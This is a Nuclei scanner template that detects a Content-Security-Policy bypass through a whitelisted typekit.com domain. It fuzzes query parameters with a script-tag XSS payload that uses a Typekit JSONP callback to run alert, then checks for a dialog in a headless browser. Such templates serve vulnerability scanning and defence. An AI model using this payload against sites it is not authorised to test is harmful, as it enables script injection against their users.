flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - typekit_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://typekit.com/api/v1/json/libraries/full?callback=alert"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: typekit_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - typekit.com
  method: GET
  path:
  - '{{BaseURL}}'
id: typekit-csp-bypass
info:
  author: Jaenact
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Typekit
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,typekit,vuln
